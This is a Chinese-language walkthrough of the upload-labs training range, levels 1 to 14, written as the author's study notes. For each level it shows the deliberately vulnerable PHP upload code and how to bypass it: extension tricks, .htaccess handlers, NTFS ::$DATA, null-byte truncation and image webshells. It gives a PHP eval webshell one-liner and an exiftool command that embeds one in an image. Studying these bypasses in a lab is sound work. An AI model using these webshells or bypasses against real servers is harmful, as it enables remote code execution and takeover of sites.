##前言
**仅以此作为本人学习过程的记录**

Upload-labs是一个所有类型的上传漏洞的靶场，截至到现在共有21个关卡，这里总结的wp不代表是唯一wp

项目地址：[https://github.com/c0ny1/upload-labs](https://github.com/c0ny1/upload-labs)

其涉及的漏洞点包括

<img src="https://upload-images.jianshu.io/upload_images/11525934-e19630249b9b8764.png" width="80%">

这里上传的图片默认名字为`1.jpg`。上传的php默认名字为`1.php`，内容为`<?php eval($_POST["a"]);?>`

##Pass-01

通过观察可以发现点击文件上传网页和后台没有数据传输，并且可以观察到相关的js过滤语句

漏洞点为客户端--js检查

利用方式

* 通过浏览器禁止运行js，位置为浏览器--设置--高级设置--内容设置--java script

或者  

* 通过bp抓包，上传1.jpg然后在bp上将文件名改回1.php，然后放包

##Pass-02

漏洞点为服务端--检查后缀--白名单--MIME绕过

源码

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])) {
	    if (file_exists(UPLOAD_PATH)) {
	        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
	            $temp_file = $_FILES['upload_file']['tmp_name'];
	            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
	            if (move_uploaded_file($temp_file, $img_path)) {
	                $is_upload = true;
	            } else {
	                $msg = '上传出错！';
	            }
	        } else {
	            $msg = '文件类型不正确，请重新上传！';
	        }
	    } else {
	        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
	    }
	}

利用方式：

* 上传1.php，BP抓包后将文件的Content-Type改为image/jpeg（以上三者之一）即可

##Pass-03

上传1.php，回显是`提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！`推测是黑名单，上传php3，可以正常访问

漏洞点为服务端--检查后缀--黑名单--上传特殊可解析后缀

源码

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])) {
	    if (file_exists(UPLOAD_PATH)) {
	        $deny_ext = array('.asp','.aspx','.php','.jsp');
	        $file_name = trim($_FILES['upload_file']['name']);
	        $file_name = deldot($file_name);//删除文件名末尾的点
	        $file_ext = strrchr($file_name, '.');
	        $file_ext = strtolower($file_ext); //转换为小写
	        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
	        $file_ext = trim($file_ext); //收尾去空
	
	        if(!in_array($file_ext, $deny_ext)) {
	            $temp_file = $_FILES['upload_file']['tmp_name'];
	            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
	            if (move_uploaded_file($temp_file,$img_path)) {
	                 $is_upload = true;
	            } else {
	                $msg = '上传出错！';
	            }
	        } else {
	            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
	        }
	    } else {
	        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
	    }
	}

漏洞产生原因：源码只对php、asp、jsp、aspx进行了过滤，但是Apache和php常用的php程序文件后缀有phtml、pht、php3、php4和php5

利用方式：

* 上传1.php3

##Pass-04

上传1.php，回显`提示：此文件不允许上传! `，为了确认是黑名单过滤还是白名单过滤，随意上传一个1.a，发现可以上传，证明是黑名单

漏洞点为服务端--检查后缀--黑名单--上传.htaccess

源码

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])) {
	    if (file_exists(UPLOAD_PATH)) {
	        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini");
	        $file_name = trim($_FILES['upload_file']['name']);
	        $file_name = deldot($file_name);//删除文件名末尾的点
	        $file_ext = strrchr($file_name, '.');
	        $file_ext = strtolower($file_ext); //转换为小写
	        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
	        $file_ext = trim($file_ext); //收尾去空
	
	        if (!in_array($file_ext, $deny_ext)) {
	            $temp_file = $_FILES['upload_file']['tmp_name'];
	            $img_path = UPLOAD_PATH.'/'.$file_name;
	            if (move_uploaded_file($temp_file, $img_path)) {
	                $is_upload = true;
	            } else {
	                $msg = '上传出错！';
	            }
	        } else {
	            $msg = '此文件不允许上传!';
	        }
	    } else {
	        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
	    }
	}

利用方式

* 上传.htaccess文件，内容如下，其意思为添加一种解析方式，即将jpg当做php解析

		AddType application/x-httpd-php .jpg

* 或者同样是上传.htaccess文件，内容如下，其意思是将上传的文件都当做php来解析

		SetHandler application/x-httpd-php

**注意：构造的.htaccess就是文件全名**

相关背景

>关于AddType命令的作用解释如下

>>AddType 指令
作用：在给定的文件扩展名与特定的内容类型之间建立映射
语法：AddType MIME-type extension [extension] ...
AddType指令在给定的文件扩展名与特定的内容类型之间建立映射关系。MIME-type指明了包含extension扩展名的文件的媒体类型。
AddType 是与类型表相关的，描述的是扩展名与文件类型之间的关系。

>此处黑名单没有过滤.htaccess后缀，故此处可上传.htaccess文件进行绕过。  
注: .htaccess文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All

>>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。

>作者：Miracle778  
>链接：https://www.jianshu.com/p/aabc1e7408d5  
>来源：简书

**补充：**

最近看到有新的方法

漏洞点为服务端--检查后缀--黑名单--配合解析漏洞--apache陌生后缀解析漏洞

利用方法：上传1.php.xxx

原理：php解析会把文件结尾理解为xxx，从而绕过黑名单，然后apache不认识xxx就继续搜索，然后找到php，就当做php解析

>先来看一下apache的主配置文件httpd.conf，搜索“DefaultType”，就可以看到这么一段注释和默认配置：

>	#
	# DefaultType: the default MIME type the server will use for a document
	# if it cannot otherwise determine one, such as from filename extensions.
	# If your server contains mostly text or HTML documents, "text/plain" is
	# a good value. If most of your content is binary, such as applications
	# or images, you may want to use "application/octet-stream" instead to
	# keep browsers from trying to display binary files as though they are
	# text.
	#10DefaultType text/plain

>DefaultType存在的意义是告诉apache该如何处理未知扩展名的文件，比如f4ck.xxx这样的文件，扩展名是xxx，这肯定不是一个正常的网页或脚本文件，这个参数就是告诉apache该怎么处理这种未知扩展名的文件。

>参数DefaultType的默认值是“text/plain”，也就是遇到未知扩展名的文件，就把它当作普通的txt文本或html文件来处理。

>测试一

>比如我将以下代码保存为f4ck.xxx  默认解析成文本

>测试二

>那么，对于文件内容为php代码的未知扩展名文件来说也是解析成文本

>**对于f4ck.php.xxx，那么就会被以module方式运行php的apache解析，因为Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名，也可以拥有多个扩展名。Apache认为应该从右到左开始判断解析方法的。如果最右侧的扩展名为不可识别的，就继续往左判断，直到判断到文件名为止。**

>解决方案一

>在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为*.php.*的访问权限：

>><FilesMatch ".(php.|php3.|php4.|php5.)">
Order Deny,Allow
Deny from all
</FilesMatch>

>解决方案二

>如果需要保留文件名，可以修改程序源代码，替换上传文件名中的“.”为“_”：

>>$filename = str_replace('.', '_', $filename);

>摘自：https://www.cnblogs.com/hack404/p/10385049.html  
>用户：APT-101  
>侵权联系删除

##Pass-05

参考Pass-04新增的方法

##Pass-06

黑盒测试知道是黑名单过滤

白盒测试知道可以修改大小写绕过

漏洞点为服务端--检查后缀--黑名单--后缀大小写绕过

源码

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])) {
	    if (file_exists(UPLOAD_PATH)) {
	        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
	        $file_name = trim($_FILES['upload_file']['name']);
	        $file_name = deldot($file_name);//删除文件名末尾的点
	        $file_ext = strrchr($file_name, '.');
	        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
	        $file_ext = trim($file_ext); //首尾去空
	
	        if (!in_array($file_ext, $deny_ext)) {
	            $temp_file = $_FILES['upload_file']['tmp_name'];
	            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
	            if (move_uploaded_file($temp_file, $img_path)) {
	                $is_upload = true;
	            } else {
	                $msg = '上传出错！';
	            }
	        } else {
	            $msg = '此文件类型不允许上传！';
	        }
	    } else {
	        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
	    }
	}

利用方法：上传1.phP

##Pass-07

黑盒测试知道是黑名单过滤

白盒测试知道可以在文件名结尾添加空格绕过

漏洞点为服务端--检查后缀--黑名单--空格绕过

源码

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])) {
	    if (file_exists(UPLOAD_PATH)) {
	        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
	        $file_name = $_FILES['upload_file']['name'];
	        $file_name = deldot($file_name);//删除文件名末尾的点
	        $file_ext = strrchr($file_name, '.');
	        $file_ext = strtolower($file_ext); //转换为小写
	        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
	        
	        if (!in_array($file_ext, $deny_ext)) {
	            $temp_file = $_FILES['upload_file']['tmp_name'];
	            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
	            if (move_uploaded_file($temp_file,$img_path)) {
	                $is_upload = true;
	            } else {
	                $msg = '上传出错！';
	            }
	        } else {
	            $msg = '此文件不允许上传';
	        }
	    } else {
	        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
	    }
	}

利用方法：上传1.php然后bp抓包修改名字为1.php[空格]

>Win下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点

##Pass-08

黑盒测试知道是黑名单过滤

白盒测试知道可以在文件名结尾添加.绕过

漏洞点为服务端--检查后缀--黑名单--点绕过

源码

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])) {
	    if (file_exists(UPLOAD_PATH)) {
	        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
	        $file_name = trim($_FILES['upload_file']['name']);
	        $file_ext = strrchr($file_name, '.');
	        $file_ext = strtolower($file_ext); //转换为小写
	        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
	        $file_ext = trim($file_ext); //首尾去空
	        
	        if (!in_array($file_ext, $deny_ext)) {
	            $temp_file = $_FILES['upload_file']['tmp_name'];
	            $img_path = UPLOAD_PATH.'/'.$file_name;
	            if (move_uploaded_file($temp_file, $img_path)) {
	                $is_upload = true;
	            } else {
	                $msg = '上传出错！';
	            }
	        } else {
	            $msg = '此文件类型不允许上传！';
	        }
	    } else {
	        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
	    }
	}

利用方法：上传1.php然后bp抓包修改文件名为1.php.

<del>小声bb：</del>貌似上传1.php.x也可以？

##Pass-09

黑盒测试知道是黑名单过滤

白盒测试知道可以在文件名结尾添加::$DATA绕过

漏洞点为服务端--检查后缀--黑名单--::$DATA绕过

源码

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])) {
	    if (file_exists(UPLOAD_PATH)) {
	        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
	        $file_name = trim($_FILES['upload_file']['name']);
	        $file_name = deldot($file_name);//删除文件名末尾的点
	        $file_ext = strrchr($file_name, '.');
	        $file_ext = strtolower($file_ext); //转换为小写
	        $file_ext = trim($file_ext); //首尾去空
	        
	        if (!in_array($file_ext, $deny_ext)) {
	            $temp_file = $_FILES['upload_file']['tmp_name'];
	            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
	            if (move_uploaded_file($temp_file, $img_path)) {
	                $is_upload = true;
	            } else {
	                $msg = '上传出错！';
	            }
	        } else {
	            $msg = '此文件类型不允许上传！';
	        }
	    } else {
	        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
	    }
	}


利用方法：上传1.php，然后bp抓包改名字为1.php::$DATA，这里还是利用windows的一个特性。简单讲就是在php+windows的情况下：如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持"::$DATA"之前的文件名

>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$DATA。

**相关特性**

>* 假设上传个info.php文件,服务器为windows,info.php内容为<?php phpinfo();
>* info.php:a.jpg 生成info.php,内容为空
>* info.php::$DATA 生成info.php,内容为<?php phpinfo();?>
>* info.php::$INDEX_ALLOCATION  生成info.php文件夹
>* info.php::$DATA0.jpg生成0.jpg,内容为<?php phpinfo();?>

##Pass-10

黑盒测试知道是黑名单过滤

白盒测试知道可以在文件名结尾.[空格].绕过

漏洞点为服务端--检查后缀--黑名单--配合解析漏洞

源码

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])) {
	    if (file_exists(UPLOAD_PATH)) {
	        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
	        $file_name = trim($_FILES['upload_file']['name']);
	        $file_name = deldot($file_name);//删除文件名末尾的点
	        $file_ext = strrchr($file_name, '.');
	        $file_ext = strtolower($file_ext); //转换为小写
	        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
	        $file_ext = trim($file_ext); //首尾去空
	        
	        if (!in_array($file_ext, $deny_ext)) {
	            $temp_file = $_FILES['upload_file']['tmp_name'];
	            $img_path = UPLOAD_PATH.'/'.$file_name;
	            if (move_uploaded_file($temp_file, $img_path)) {
	                $is_upload = true;
	            } else {
	                $msg = '上传出错！';
	            }
	        } else {
	            $msg = '此文件类型不允许上传！';
	        }
	    } else {
	        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
	    }
	}

这里对文件名只有一个去除末尾点和空格的操作，也就是说上传1.php.[空格].最后处理为1.php.，这也是利用了windows的特点。

##Pass-11

上传1.php，发现文件名变为1.，证明把php替换成了空

漏洞点为服务端--检查后缀--黑名单--双后缀名绕过

源码

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])) {
	    if (file_exists(UPLOAD_PATH)) {
	        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess","ini");
	
	        $file_name = trim($_FILES['upload_file']['name']);
	        $file_name = str_ireplace($deny_ext,"", $file_name);
	        $temp_file = $_FILES['upload_file']['tmp_name'];
	        $img_path = UPLOAD_PATH.'/'.$file_name;        
	        if (move_uploaded_file($temp_file, $img_path)) {
	            $is_upload = true;
	        } else {
	            $msg = '上传出错！';
	        }
	    } else {
	        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
	    }
	}

这里的str_ireplace()是str_place()的升级版，忽略了大小写
这里把黑名单中的字符都替换成了空，根据函数从左到右检查的特性，如果上传1.phphpp，那处理完变成hpp，如果上传1.pphphp，那处理完变成1.php

利用方式：上传1.pphphp

##Pass-12

黑盒测试发现是白名单过滤

漏洞点为服务端--检查后缀--白名单--%00截断

源码 

	$is_upload = false;
	$msg = null;
	if(isset($_POST['submit'])){
	    $ext_arr = array('jpg','png','gif');
	    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
	    if(in_array($file_ext,$ext_arr)){
	        $temp_file = $_FILES['upload_file']['tmp_name'];
	        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
	
	        if(move_uploaded_file($temp_file,$img_path)){
	            $is_upload = true;
	        } else {
	            $msg = '上传出错！';
	        }
	    } else{
	        $msg = "只允许上传.jpg|.png|.gif类型文件！";
	    }
	}

白盒测试发现后缀要为jpg或者其他两个，只能改变文件路径使其索引到php去，也就是用%00截断，跟c语言一眼，php会将%00视为字符串结尾

但对环境有如下要求：

>1、php版本小于5.3.4  
2、php.ini的magic_quotes_gpc为OFF状态

利用方法：上传1.jpg，然后bp抓包在save_path处改成/upload/1.php%00

##Pass-13

黑盒测试发现是白名单

漏洞点为服务端--检查后缀--白名单--0x00截断

源码

	$is_upload = false;
	$msg = null;
	if(isset($_POST['submit'])){
	    $ext_arr = array('jpg','png','gif');
	    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
	    if(in_array($file_ext,$ext_arr)){
	        $temp_file = $_FILES['upload_file']['tmp_name'];
	        $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
	
	        if(move_uploaded_file($temp_file,$img_path)){
	            $is_upload = true;
	        } else {
	            $msg = "上传失败";
	        }
	    } else {
	        $msg = "只允许上传.jpg|.png|.gif类型文件！";
	    }
	}

发现是POST传值

利用方法：用0x00截断，上传1.jpg然后bp抓包，路径那里填1.php%00，然后选中%00按ctrl+shift+u，或者下面这样

<img src="https://raw.githubusercontent.com/picgouser/pic/master/20200307021159.png" width="60%">

也可以修改hex成00，%00的16进制编码是25 30 30

<img src="https://raw.githubusercontent.com/picgouser/pic/master/20200307021708.png" width="60%">


**总结一下Pass-12和Pass-13**

共同点：   
1. 都要求php版本在5.3.4以下    
2. 都要求php.ini的magic_quotes_gpc为OFF   
3. 都是使用截断

不同点：  
1. GET传值在网址处可以看得到，用%00截断  
2. POST传值在网址处不可以看到，用0x00截断

%00与0x00截断的区别：  
原理一样，只是在Pass-12中为GET方式，服务器在进行URL解码时将其解码成0x00,Pass-13中为POST方式，没有URL解码这一步骤，所以要在hex值中修改，形成0x00截断。


##Pass-14

漏洞点为服务端--检查内容--文件头检查

源码

	function getReailFileType($filename){
	    $file = fopen($filename, "rb");
	    $bin = fread($file, 2); //只读2字节
	    fclose($file);
	    $strInfo = @unpack("C2chars", $bin);    
	    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
	    $fileType = '';    
	    switch($typeCode){      
	        case 255216:            
	            $fileType = 'jpg';
	            break;
	        case 13780:            
	            $fileType = 'png';
	            break;        
	        case 7173:            
	            $fileType = 'gif';
	            break;
	        default:            
	            $fileType = 'unknown';
	        }    
	        return $fileType;
	}
	
	$is_upload = false;
	$msg = null;
	if(isset($_POST['submit'])){
	    $temp_file = $_FILES['upload_file']['tmp_name'];
	    $file_type = getReailFileType($temp_file);
	
	    if($file_type == 'unknown'){
	        $msg = "文件未知，上传失败！";
	    }else{
	        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
	        if(move_uploaded_file($temp_file,$img_path)){
	            $is_upload = true;
	        } else {
	            $msg = "上传出错！";
	        }
	    }
	}

文件包含页面源码

	 <?php
	/*
	本页面存在文件包含漏洞，用于测试图片马是否能正常运行！
	*/
	header("Content-Type:text/html;charset=utf-8");
	$file = $_GET['file'];
	if(isset($file)){
	    include $file;
	}else{
	    show_source(__file__);
	}
	?> 

漏洞原理：  
>1. 检测上传文件只检测前两个字节，导致木马文件可能藏在后面  
>2. php中的include()会把文件当做php文件来执行

容易导致文件包含的函数：

	
	include()  
	require()  
	inlcude_once()  
	require_once()


利用方式：通过上传包含木马内容的图片文件，从而绕过上传检测，然后利用include.php把图片文件当做php文件来执行。

制作图片马cmd下运行copy 1.jpg /b 2.php /a 3.jpg，上传绕过检测，然后构造payroad：http://127.0.0.1:8080/include.php?file=upload/3.jpg

**补充**

制作图片马时可以把木马放在图片的comment中，用exiftool工具

	exiftool "-comment=<?php echo 'hello world';eval($_POST['a']); ?>" 4.jpg
结果如下

<img src="https://raw.githubusercontent.com/picgouser/pic/master/20200317023138.png" width="60%">

<img src="https://raw.githubusercontent.com/picgouser/pic/master/20200317023346.png" width="60%">





